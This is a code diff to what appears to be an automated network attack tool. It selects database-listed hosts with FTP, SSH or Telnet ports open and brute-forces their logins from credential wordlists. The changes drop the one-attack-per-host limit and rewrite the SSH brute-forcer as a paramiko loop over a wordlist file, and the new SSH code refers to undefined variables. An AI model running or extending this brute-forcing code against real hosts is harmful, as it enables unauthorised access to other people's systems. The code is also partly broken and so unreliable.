@@ -33,20 +33,17 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
             #We have to set an extra boolean so a match will skip the other possible matches
             # (i.e. don't repeat attacking the same host if other services are running on same host)
             for work in hosts.find({'location':monkeyLoc}):
-                if 21 in work['ports'] and targetTried == False:
+                if 21 in work['ports']:
                     targets.append(work['ip'])
                     ports.append(21)
-                    targetTried = True
 
-                if 22 in work['ports'] and targetTried == False:
+                if 22 in work['ports']:
                     targets.append(work['ip'])
                     ports.append(22)
-                    targetTried = True
 
-                if 23 in work['ports'] and targetTried == False:
+                if 23 in work['ports']:
                     targets.append(work['ip'])
                     ports.append(23)
-                    targetTried = True
 
 
         if len(targets) == 0:
@@ -68,19 +65,33 @@ def findLoginBoxes(runTime,dbIp,dbName,monkeyIq,monkeyLoc,monkeyId):
                 telBrute(targets[index],db,hosts,monkeyId)
 
 def sshBrute(victim,db,coll,monkeyId):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    startTime = time.ctime()
 
     try:
-        with open './lists/'
-    try:
-        ssh.connect(target, 22, usr, pwd)
+        with open('./lists/wordlist_ssh.txt') as f:
+            credList = f.readlines()
 
-    except paramiko.AuthenticationException:
-        pass
+    except:
+        print 'Error opening SSH cred list.'
+        return
 
-    except socket.error:
-        pass
+    for creds in credList:
+        user, pwd = creds.rstrip().split(':')
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            ssh.connect(target, 22, usr, pwd)
+
+        except paramiko.AuthenticationException:
+            pass
+
+        except socket.error:
+            pass
+
+    endTime = time.ctime()
+    print 'Finished SSH brute forcing of ' + victim + 'at ' + endTime
+    saveResults('sshbruteforce',db,coll,victim,22,startTime,endTime,monkeyId)
 
 def ftpBrute(victim,db,coll,monkeyId):
     startTime = time.ctime()
@@ -105,8 +116,9 @@ def ftpBrute(victim,db,coll,monkeyId):
             pass
 
     endTime = time.ctime()
-    print 'finished FTP brute forcing of ' + victim + 'at' + endTime
+    print 'finished FTP brute forcing of ' + victim + 'at ' + endTime
     saveResults('ftpbruteforce',db,coll,victim,21,startTime,endTime,monkeyId)
+    return
 
 def telBrute (victim,db,coll,monkeyId):
     startTime = time.ctime()
@@ -133,7 +145,7 @@ def telBrute (victim,db,coll,monkeyId):
             pass
 
     endTime = time.ctime()
-    print 'finished telnet brute forcing of ' + victim + 'at' + endTime
+    print 'finished telnet brute forcing of ' + victim + 'at ' + endTime
     saveResults('telnetbruteforce',db,coll,victim,23,startTime,endTime,monkeyId)
 
 def saveResults(whichBrute,dbConn,coll,target,port,startTime,endTime,monkeyId):
